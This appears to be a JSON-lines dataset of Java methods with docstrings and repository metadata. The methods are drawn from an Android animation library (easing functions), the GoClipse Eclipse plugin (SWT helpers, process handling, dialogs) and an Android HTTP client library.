{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @param pow             pow The exponent to use (ex. 3 would return a cubic ease).\n * @return easedValue\n */\n", "func_signal": "private static float getPowInOut(float elapsedTimeRate, double pow)", "code": "{\n    if ((elapsedTimeRate *= 2) < 1) {\n        return (float) (0.5 * Math.pow(elapsedTimeRate, pow));\n    }\n\n    return (float) (1 - 0.5 * Math.abs(Math.pow(2 - elapsedTimeRate, pow)));\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @return easedValue\n */\n", "func_signal": "private static float getBounceOut(float elapsedTimeRate)", "code": "{\n    if (elapsedTimeRate < 1 / 2.75) {\n        return (float) (7.5625 * elapsedTimeRate * elapsedTimeRate);\n    } else if (elapsedTimeRate < 2 / 2.75) {\n        return (float) (7.5625 * (elapsedTimeRate -= 1.5 / 2.75) * elapsedTimeRate + 0.75);\n    } else if (elapsedTimeRate < 2.5 / 2.75) {\n        return (float) (7.5625 * (elapsedTimeRate -= 2.25 / 2.75) * elapsedTimeRate + 0.9375);\n    } else {\n        return (float) (7.5625 * (elapsedTimeRate -= 2.625 / 2.75) * elapsedTimeRate + 0.984375);\n    }\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Adds a child to the top of the display list.\n *\n * @param DisplayObject DisplayObject2\n * @return this\n */\n", "func_signal": "public FPSTextureView addChild(@NonNull DisplayBase DisplayObject)", "code": "{\n    DisplayObject.setUp(mFps);\n    mDisplayList.add(DisplayObject);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Swaps the specified children's depth in the display list. If either child is not a child of this Container, return false.\n *\n * @param child1 DisplayObject\n * @param child2 DisplayObject\n * @return if true, success to swapChildren\n */\n", "func_signal": "public boolean swapChildren(@NonNull DisplayBase child1, @NonNull DisplayBase child2)", "code": "{\n    int childIndex1 = mDisplayList.indexOf(child1);\n    int childIndex2 = mDisplayList.indexOf(child2);\n\n    if (childIndex1 == -1 || childIndex2 == -1) {\n        return false;\n    }\n\n    removeChildAt(childIndex1);\n    addChildAt(childIndex1, child2);\n    removeChildAt(childIndex2);\n    addChildAt(childIndex2, child1);\n    return true;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @param amplitude       Amplitude of easing\n * @param period          Animation of period\n * @return easedValue\n */\n", "func_signal": "private static float getElasticInOut(float elapsedTimeRate, double amplitude, double period)", "code": "{\n    double pi2 = Math.PI * 2;\n\n    double s = period / pi2 * Math.asin(1 / amplitude);\n    if ((elapsedTimeRate *= 2) < 1) {\n        return (float) (-0.5f * (amplitude * Math.pow(2, 10 * (elapsedTimeRate -= 1f)) * Math.sin((elapsedTimeRate - s) * pi2 / period)));\n    }\n    return (float) (amplitude * Math.pow(2, -10 * (elapsedTimeRate -= 1)) * Math.sin((elapsedTimeRate - s) * pi2 / period) * 0.5 + 1);\n\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Removes all children from the display list.\n *\n * @return this\n */\n", "func_signal": "public Container removeAllChildren()", "code": "{\n    mDisplayList.clear();\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\Container.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @param amplitude       Amplitude of easing\n * @param period          Animation of period\n * @return easedValue\n */\n", "func_signal": "private static float getElasticOut(float elapsedTimeRate, double amplitude, double period)", "code": "{\n    if (elapsedTimeRate == 0 || elapsedTimeRate == 1) return elapsedTimeRate;\n\n    double pi2 = Math.PI * 2;\n    double s = period / pi2 * Math.asin(1 / amplitude);\n    return (float) (amplitude * Math.pow(2, -10 * elapsedTimeRate) * Math.sin((elapsedTimeRate - s) * pi2 / period) + 1);\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * The left offset and y offset for this display object's registration point. For example, to make a 100x100px Bitmap rotate\n * around its center, you would set regX and regY to 50.\n *\n * @param regX The horizontal rotate registration point in pixels\n * @param regY The vertical rotate registration point in pixels\n * @return this\n */\n", "func_signal": "public RectDrawer rotateRegistration(float regX, float regY)", "code": "{\n    setRotateRegistration(regX, regY);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\drawer\\RectDrawer.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Stop tick\n */\n", "func_signal": "public void tickStop()", "code": "{\n    if (mTimer != null) {\n        mTimer.cancel();\n        mTimer = null;\n    }\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Removes all children from the display list.\n *\n * @return this\n */\n", "func_signal": "public FPSTextureView removeAllChildren()", "code": "{\n    mDisplayList.clear();\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Set animation class.\n * Use this method only when there is need to your own custom class of animation,\n *\n * @param animator Animator instance\n * @return this\n */\n", "func_signal": "public DisplayBase animator(@NonNull Animator animator)", "code": "{\n    this.mAnimator = animator;\n    mAnimParameter = mAnimator.getInitialAnimParameter();\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\DisplayBase.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param ease            Easing type\n * @param elapsedTimeRate Elapsed time / Total time\n * @return easedValue\n */\n", "func_signal": "public static float get(@NonNull Ease ease, float elapsedTimeRate)", "code": "{\n    switch (ease) {\n        case LINEAR:\n        case NONE:\n            return 1f;\n        case QUAD_IN:\n            return getPowIn(elapsedTimeRate, 2);\n        case QUAD_OUT:\n            return getPowOut(elapsedTimeRate, 2);\n        case QUAD_IN_OUT:\n            return getPowInOut(elapsedTimeRate, 2);\n        case CUBIC_IN:\n            return getPowIn(elapsedTimeRate, 3);\n        case CUBIC_OUT:\n            return getPowOut(elapsedTimeRate, 3);\n        case CUBIC_IN_OUT:\n            return getPowInOut(elapsedTimeRate, 3);\n        case QUART_IN:\n            return getPowIn(elapsedTimeRate, 4);\n        case QUART_OUT:\n            return getPowOut(elapsedTimeRate, 4);\n        case QUART_IN_OUT:\n            return getPowInOut(elapsedTimeRate, 4);\n        case QUINT_IN:\n            return getPowIn(elapsedTimeRate, 5);\n        case QUINT_OUT:\n            return getPowOut(elapsedTimeRate, 5);\n        case QUINT_IN_OUT:\n            return getPowInOut(elapsedTimeRate, 5);\n        case SINE_IN:\n            return (float) (1f - Math.cos(elapsedTimeRate * Math.PI / 2f));\n        case SINE_OUT:\n            return (float) Math.sin(elapsedTimeRate * Math.PI / 2f);\n        case SINE_IN_OUT:\n            return (float) (-0.5f * (Math.cos(Math.PI * elapsedTimeRate) - 1f));\n        case BACK_IN:\n            return (float) (elapsedTimeRate * elapsedTimeRate * ((1.7 + 1f) * elapsedTimeRate - 1.7));\n        case BACK_OUT:\n            return (float) (--elapsedTimeRate * elapsedTimeRate * ((1.7 + 1f) * elapsedTimeRate + 1.7) + 1f);\n        case BACK_IN_OUT:\n            return getBackInOut(elapsedTimeRate, 1.7f);\n        case CIRC_IN:\n            return (float) -(Math.sqrt(1f - elapsedTimeRate * elapsedTimeRate) - 1);\n        case CIRC_OUT:\n            return (float) Math.sqrt(1f - (--elapsedTimeRate) * elapsedTimeRate);\n        case CIRC_IN_OUT:\n            if ((elapsedTimeRate *= 2f) < 1f) {\n                return (float) (-0.5f * (Math.sqrt(1f - elapsedTimeRate * elapsedTimeRate) - 1f));\n            }\n            return (float) (0.5f * (Math.sqrt(1f - (elapsedTimeRate -= 2f) * elapsedTimeRate) + 1f));\n        case BOUNCE_IN:\n            return getBounceIn(elapsedTimeRate);\n        case BOUNCE_OUT:\n            return getBounceOut(elapsedTimeRate);\n        case BOUNCE_IN_OUT:\n            if (elapsedTimeRate < 0.5f) {\n                return getBounceIn(elapsedTimeRate * 2f) * 0.5f;\n            }\n            return getBounceOut(elapsedTimeRate * 2f - 1f) * 0.5f + 0.5f;\n        case ELASTIC_IN:\n            return getElasticIn(elapsedTimeRate, 1, 0.3);\n\n        case ELASTIC_OUT:\n            return getElasticOut(elapsedTimeRate, 1, 0.3);\n\n        case ELASTIC_IN_OUT:\n            return getElasticInOut(elapsedTimeRate, 1, 0.45);\n\n        default:\n            return 1f;\n\n    }\n\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Start tick\n *\n * @return this\n */\n", "func_signal": "public FPSTextureView tickStart()", "code": "{\n    tickStop();\n    mTimer = new Timer();\n    mTimer.schedule(new TimerTask() {\n        @Override\n        public void run() {\n            onTick();\n        }\n    }, 0, 1000 / mFps);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Returns the standard display to be used. The method first checks, if\n * the thread calling this method has an associated disaply. If so, this\n * display is returned. Otherwise the method returns the default display.\n */\n", "func_signal": "public static Display getStandardDisplay()", "code": "{\n\tDisplay display = Display.getCurrent();\n\tif (display == null)\n\t\tdisplay = Display.getDefault();\n\treturn display;\t\t\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\util\\swt\\SWTUtil.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "// test that shutdownNow interrupts current task.\n", "func_signal": "public void testShutdownNow_Interrupt() throws InterruptedException", "code": "{\n\ttry(Tests_ExecutorTaskAgent agent = new Tests_ExecutorTaskAgent(\"testShutdownNow_Interrupt\")) {\n\t\tLatchRunnable firstTask = new LatchRunnable(false);\n\t\tagent.submit(firstTask);\n\t\t\n\t\tFuture<?> future = agent.submit(new LatchRunnable(true));\n\t\t\n\t\tfirstTask.awaitTaskEntry();\n\t\t\n\t\tassertTrue(future.isDone() == false);\n\t\tList<Runnable> cancelledTasks = agent.shutdownNowAndCancelAll();\n\t\tassertTrue(cancelledTasks.size() == 1);\n\t\tassertTrue(future.isCancelled());\n\t\t\n\t\tagent.awaitTermination();\n\t}\n}", "path": "melnorme_util\\src-test\\melnorme\\utilbox\\concurrency\\ExecutorTaskAgent_Test.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.ui.dialogs.SelectionDialog#getDialogBoundsSettings()\n */\n", "func_signal": "@Override\nprotected IDialogSettings getDialogBoundsSettings()", "code": "{\n\tIDialogSettings settings = LangUIPlugin.getDefault().getDialogSettings();\n\tIDialogSettings section = settings.getSection(getDialogSettingsId());\n\tif (section == null) {\n\t\tsection = settings.addNewSection(getDialogSettingsId());\n\t} \n\treturn section;\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/**\n * Await termination of process, with given timeoutMs timeout in milliseconds (-1 for no timeout).\n * Periodically polls for cancellation.\n * @return the process exit value.\n * @throws InterruptedException if thread interrupted.\n * @throws TimeoutException if timeout reached.\n * @throws OperationCancellation if process reader cancellation was requested.\n */\n", "func_signal": "protected void awaitReadersTermination(int timeoutMs) \n\t\tthrows InterruptedException, TimeoutException, OperationCancellation", "code": "{\n\tint waitedTime = 0;\n\t\n\twhile(true) {\n\t\tif(isCanceled()) {\n\t\t\tthrow new OperationCancellation();\n\t\t}\n\t\tint cancelPollPeriodMs = getCancelPollingPeriodMs();\n\t\tboolean latchSuccess = doAwaitTermination(cancelPollPeriodMs);\n\t\tif(latchSuccess) {\n\t\t\treturn;\n\t\t}\n\t\tif(timeoutMs != NO_TIMEOUT && waitedTime >= timeoutMs) {\n\t\t\tthrow new TimeoutException();\n\t\t}\n\t\twaitedTime += cancelPollPeriodMs;\n\t}\n}", "path": "melnorme_util\\src\\melnorme\\utilbox\\process\\ExternalProcessHandler.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.jface.dialogs.Dialog#createContents(org.eclipse.swt.widgets.Composite)\n */\n", "func_signal": "@Override\nprotected Control createContents(Composite parent)", "code": "{\n\tComposite comp = (Composite) super.createContents(parent);\n\tinitializeControls();\n\treturn comp;\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.debug.internal.ui.launchConfigurations.AbstractDebugSelectionDialog#initializeControls()\n */\n", "func_signal": "@Override\nprotected void initializeControls()", "code": "{\n\tList<?> selectedElements = getInitialElementSelections();\n\tif (selectedElements != null && !selectedElements.isEmpty()){\n\t\tgetCheckBoxTableViewer().setCheckedElements(selectedElements.toArray());\n\t\tgetCheckBoxTableViewer().setSelection(StructuredSelection.EMPTY);\n\t}\n\tsuper.initializeControls();\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/**\n * Post {@link Control#setFocus()} on the UI thread, if current thread not UI thread.\n */\n", "func_signal": "public static void post_setFocus(final Text control)", "code": "{\n\tif(!isOkToUse(control)) {\n\t\treturn;\n\t}\n\t\n\tDisplay display = control.getDisplay();\n\tif(display == Display.getCurrent()) {\n\t\tcontrol.setFocus();\n\t} else {\n\t\tdisplay.asyncExec(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tif(!control.isDisposed()) {\n\t\t\t\t\tcontrol.setFocus();\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\util\\swt\\SWTUtil.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "// Can be null\n", "func_signal": "public ExternalProcessHandler(Process process, boolean readStdErr, boolean startReaders,\n\t\t\tICancelMonitor cancelMonitor)", "code": "{\n\t\tthis.process = process;\n\t\tthis.readStdErr = readStdErr;\n\t\tthis.cancelMonitor = cancelMonitor == null ? new NullCancelMonitor() : cancelMonitor;\n\t\t\n\t\tthis.readersAndProcessTerminationLatch = new CountDownLatch(1);\n\t\t\n\t\tthis.stdoutReaderTask = assertNotNull(init_StdOutReaderTask());\n\t\tthis.stderrReaderTask = assertNotNull(init_StdErrReaderTask());\n\t\t\n\t\tthis.mainReaderThread = new ProcessHelperMainThread(stdoutReaderTask);\n\t\tthis.stderrReaderThread = init_StdErrThread(readStdErr);\n\t\t\n\t\tif(startReaders) {\n\t\t\tstartReaderThreads();\n\t\t}\n\t}", "path": "melnorme_util\\src\\melnorme\\utilbox\\process\\ExternalProcessHandler.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/** \n * Initialize services that should only be started after the UI plugin \n * (or other application plugin such as test runner) has started.\n * This is because the UI plugin might register listeners into core services, \n * and this ensures that the UI plugin gets all updates, because they will only start after this. \n */\n", "func_signal": "public final void initializeAfterUIStart()", "code": "{\n\tif(initializedAfterUI == true) {\n\t\tLangCore.logWarning(\"Atempted initializeAfterUIStart more than once.\");\n\t} else {\n\t\tinitializedAfterUI = true;\n\t\t\n\t\tlangCore.startAgentsAfterUIStart();\n\t}\n}", "path": "plugin_ide.core\\src-lang\\melnorme\\lang\\ide\\core\\LangCorePlugin.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/** Returns true or false according to whether scanner matches given sequence, with given firstChar already read\n * from the scanner. \n */\n", "func_signal": "protected static boolean matchesSequence(ICharacterScanner scanner, int firstChar, char[] sequence)", "code": "{\n\tint ch = firstChar;\n\tif(ch == sequence[0]) {\n\t\tfor(int i = 1; i < sequence.length; ++i) {\n\t\t\tch = scanner.read();\n\t\t\t// The if will also trigger if ch is EOF\n\t\t\tif(ch != sequence[i]) {\n\t\t\t\t// need to rewind scanner until first character\n\t\t\t\tscannerUnread(scanner, i);\n\t\t\t\treturn false; \n\t\t\t}\n\t\t}\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\core_text\\FullPatternRule.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* ----------------- validation: ----------------- */\n", "func_signal": "public void validate() throws CommonException", "code": "{\n\tgoRoot.validate();\n\tgoPath.validate();\n}", "path": "plugin_tooling\\src\\com\\googlecode\\goclipse\\tooling\\env\\GoEnvironment.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* -----------------  ----------------- */\n", "func_signal": "public GoPackageName findGoPackageForSourceFile(Location goSourceFileLoc) throws CommonException", "code": "{\n\tLocation goPackageLocation = goSourceFileLoc.getParent();\n\treturn findGoPackageForLocation(goPackageLocation);\n}", "path": "plugin_tooling\\src\\com\\googlecode\\goclipse\\tooling\\env\\GoEnvironment.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/** Runs the runnable in the SWT thread. \n * (Simply runs the runnable if the current thread is the UI thread,\n * otherwise calls the runnable in asyncexec.) */\n", "func_signal": "public static void runInSWTThread(Runnable runnable)", "code": "{\n\tif(Display.getCurrent() == null) {\n\t\tDisplay.getDefault().asyncExec(runnable);\n\t} else {\n\t\trunnable.run();\n\t}\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\util\\swt\\SWTUtil.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.debug.internal.ui.launchConfigurations.AbstractDebugSelectionDialog#getContentProvider()\n */\n", "func_signal": "@Override\nprotected IContentProvider getContentProvider()", "code": "{\n\treturn new IStructuredContentProvider() {\n\t\t@Override\n\t\tpublic Object[] getElements(Object inputElement) {\n\t\t\tEnvironmentVariable[] elements = null;\n\t\t\tif (inputElement instanceof HashMap) {\n\t\t\t\tComparator<Object> comparator = new Comparator<Object>() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic int compare(Object o1, Object o2) {\n\t\t\t\t\t\tString s1 = (String) o1;\n\t\t\t\t\t\tString s2 = (String) o2;\n\t\t\t\t\t\treturn s1.compareTo(s2);\n\t\t\t\t\t}\n\t\t\t\t};\n\t\t\t\tTreeMap<Object, Object> envVars = new TreeMap<Object, Object>(comparator);\n\t\t\t\tenvVars.putAll((Map<?, ?>) inputElement);\n\t\t\t\telements = new EnvironmentVariable[envVars.size()];\n\t\t\t\tint index = 0;\n\t\t\t\tfor (Iterator<Object> iterator = envVars.keySet().iterator(); iterator.hasNext(); index++) {\n\t\t\t\t\tObject key = iterator.next();\n\t\t\t\t\telements[index] = (EnvironmentVariable) envVars.get(key);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn elements;\n\t\t}\n\t\t@Override\n\t\tpublic void dispose() {\t\n\t\t}\n\t\t@Override\n\t\tpublic void inputChanged(Viewer viewer, Object oldInput, Object newInput) {\n\t\t}\n\t};\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/** Show an info (OK button) MsgBox with given title and message. */\n", "func_signal": "public static int showInfoMsgBox(Shell shell, String title, String message)", "code": "{\n\tMessageBox messageBox = new MessageBox(shell, SWT.OK);\n\tmessageBox.setText(title);\n\tmessageBox.setMessage(message);\n\treturn messageBox.open(); \n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\util\\swt\\SWTUtil.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* ----------------- writing helpers ----------------- */\n", "func_signal": "@Override\npublic void writeInput(String input, Charset charset) throws IOException", "code": "{\n\tif(input == null)\n\t\treturn;\n\t\n\tOutputStream processInputStream = getProcess().getOutputStream();\n\tStreamUtil.writeStringToStream(input, processInputStream, charset);\n}", "path": "melnorme_util\\src\\melnorme\\utilbox\\process\\ExternalProcessHandler.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.jface.dialogs.Dialog#createDialogArea(org.eclipse.swt.widgets.Composite)\n */\n", "func_signal": "@Override\nprotected Control createDialogArea(Composite parent)", "code": "{\n\tinitializeDialogUnits(parent);\n\tComposite comp = (Composite) super.createDialogArea(parent);\n\taddCustomHeaderControls(comp);\n\tString label = getMessage();\n\tif(label != null && !EMPTY_STRING.equals(label)) {\n\t\tSWTFactory.createWrapLabel(comp, label, 1);\n\t}\n\tlabel = getViewerLabel();\n\tif(label != null && !EMPTY_STRING.equals(label)) {\n\t\tSWTFactory.createLabel(comp, label, 1);\n\t}\n\tfViewer = createViewer(comp);\n\tfViewer.setLabelProvider(getLabelProvider());\n\tfViewer.setContentProvider(getContentProvider());\n\tfViewer.setInput(getViewerInput());\n\tList<?> selectedElements = getInitialElementSelections();\n\tif (selectedElements != null && !selectedElements.isEmpty()){\n\t\tfViewer.setSelection(new StructuredSelection(selectedElements));\n\t}\n\taddViewerListeners(fViewer);\n\taddCustomFooterControls(comp);\n\tDialog.applyDialogFont(comp);\n\tString help = getHelpContextId();\n\tif(help != null) {\n\t\tPlatformUI.getWorkbench().getHelpSystem().setHelp(comp, help);\n\t}\n\treturn comp;\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/**\n * Constructor\n * @param parentShell the parent shell\n */\n", "func_signal": "public AbstractDebugSelectionDialog(Shell parentShell)", "code": "{\n\tsuper(parentShell);\n\tsetDialogBoundsSettings(getDialogBoundsSettings(), Dialog.DIALOG_PERSISTSIZE);\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/**\n * Constructor\n * @param parentShell the parent shell\n */\n", "func_signal": "public AbstractDebugCheckboxSelectionDialog(Shell parentShell)", "code": "{\n\tsuper(parentShell);\n\tsetShellStyle(getShellStyle() | SWT.RESIZE);\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\lang\\ide\\ui\\build\\NativeEnvironmentSelectionDialog.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/** Sets the enable state of the composite's children, recursively. */\n", "func_signal": "public static void recursiveSetEnabled(Composite composite, boolean enabled)", "code": "{\n\tfor(Control control : composite.getChildren() ) {\n\t\tif(control instanceof Composite) {\n\t\t\trecursiveSetEnabled((Composite) control, enabled);\n\t\t}\n\t\tcontrol.setEnabled(enabled);\n\t}\n}", "path": "plugin_ide.ui\\src-lang\\melnorme\\util\\swt\\SWTUtil.java", "repo_name": "GoClipse/goclipse", "stars": 836, "license": "epl-1.0", "language": "java", "size": 149074}
{"docstring": "/**\n * create an apache request\n */\n", "func_signal": "private HttpUriRequest createApacheRequest(AbstractRequest request) throws HttpClientException", "code": "{\n    HttpEntityEnclosingRequestBase entityRequset = null;\n    switch (request.getMethod()) {\n        case Get:\n            return new HttpGet(request.createFullUri());\n        case Head:\n            return new HttpHead(request.createFullUri());\n        case Delete:\n            return new HttpDelete(request.createFullUri());\n        case Trace:\n            return new HttpTrace(request.createFullUri());\n        case Options:\n            return new HttpOptions(request.createFullUri());\n        case Post:\n            entityRequset = new HttpPost(request.createFullUri());\n            break;\n        case Put:\n            entityRequset = new HttpPut(request.createFullUri());\n            break;\n        case Patch:\n            entityRequset = new HttpPatch(request.createFullUri());\n            break;\n        default:\n            return new HttpGet(request.createFullUri());\n    }\n    entityRequset.setEntity(EntityBuilder.build(request));\n    return entityRequset;\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * This horrible hack is required on Android, due to implementation of BasicManagedEntity, which\n * doesn't chain call consumeContent on underlying wrapped HttpEntity\n *\n * @param entity HttpEntity, may be null\n */\n", "func_signal": "public void consumeEntityContent(HttpEntity entity)", "code": "{\n    try {\n        // Close the InputStream and release the resources by \"consuming the content\".\n        if (entity instanceof HttpEntityWrapper) {\n            Field f = null;\n            Field[] fields = HttpEntityWrapper.class.getDeclaredFields();\n            for (Field ff : fields) {\n                if (ff.getName().equals(\"wrappedEntity\")) {\n                    f = ff;\n                    break;\n                }\n            }\n            if (f != null) {\n                f.setAccessible(true);\n                HttpEntity wrapped = (HttpEntity) f.get(entity);\n                if (wrapped != null) {\n                    wrapped.consumeContent();\n                    if (HttpLog.isPrint) {\n                        HttpLog.d(TAG, \"HttpEntity wrappedEntity reflection consumeContent\");\n                    }\n                }\n            }\n        } else {\n            entity.consumeContent();\n        }\n    } catch (Throwable t) {\n        HttpLog.e(TAG, \"wrappedEntity consume error. \", t);\n    }\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * get Charset String From HTTP Response\n */\n", "func_signal": "private String getCharsetFromEntity(HttpEntity entity, String defCharset)", "code": "{\n    final Header header = entity.getContentType();\n    if (header != null) {\n        final HeaderElement[] elements = header.getElements();\n        if (elements.length > 0) {\n            HeaderElement helem = elements[0];\n            // final String mimeType = helem.getName();\n            final NameValuePair[] params = helem.getParameters();\n            if (params != null) {\n                for (final NameValuePair param : params) {\n                    if (param.getName().equalsIgnoreCase(\"charset\")) {\n                        String s = param.getValue();\n                        if (s != null && s.length() > 0) {\n                            return s;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return defCharset == null ? Charsets.UTF_8 : defCharset;\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u5224\u65ad\u662f\u5426\u6709\u53ef\u7528\u72b6\u6001\u7684Wifi\uff0c\u4ee5\u4e0b\u60c5\u51b5\u8fd4\u56defalse\uff1a\n *  1. \u8bbe\u5907wifi\u5f00\u5173\u5173\u6389;\n *  2. \u5df2\u7ecf\u6253\u5f00\u98de\u884c\u6a21\u5f0f\uff1b\n *  3. \u8bbe\u5907\u6240\u5728\u533a\u57df\u6ca1\u6709\u4fe1\u53f7\u8986\u76d6\uff1b\n *  4. \u8bbe\u5907\u5728\u6f2b\u6e38\u533a\u57df\uff0c\u4e14\u5173\u95ed\u4e86\u7f51\u7edc\u6f2b\u6e38\u3002\n *  \n * @param context\n * @return boolean wifi\u4e3a\u53ef\u7528\u72b6\u6001\uff08\u4e0d\u4e00\u5b9a\u6210\u529f\u8fde\u63a5\uff0c\u5373Connected\uff09\u5373\u8fd4\u56deture\n */\n", "func_signal": "public static boolean isWifiAvailable(Context context)", "code": "{\n\tNetworkInfo[] nets = getConnManager(context).getAllNetworkInfo();\n\tif (nets != null) {\n\t\tfor (NetworkInfo net : nets) {\n\t\t\tif (net.getType() == ConnectivityManager.TYPE_WIFI) { return net.isAvailable(); }\n\t\t}\n\t}\n\treturn false;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
